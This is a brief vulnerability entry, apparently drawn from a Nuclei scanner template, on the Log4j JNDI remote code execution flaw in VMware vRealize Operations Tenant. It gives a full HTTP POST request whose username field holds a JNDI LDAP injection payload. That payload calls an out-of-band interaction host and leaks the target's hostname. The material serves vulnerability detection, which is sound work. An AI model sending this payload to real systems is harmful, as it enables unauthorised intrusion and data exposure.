# Vulnerability: VMware vRealize Operations Tenant - JNDI Remote Code Execution (Apache Log4j)
**Classification:** CWE-77
**Source:** Nuclei Template (`vrealize-operations-log4j-rce.yaml`)

## Description
VMware vRealize Operations is susceptible to a critical vulnerability in Apache Log4j which may allow remote code execution in an impacted vRealize Operations Tenant application.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /suite-api/api/auth/token/acquire HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Origin: {{RootURL}}
Referer: {{RootURL}}/ui/

{"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}","password":"admin"}
```

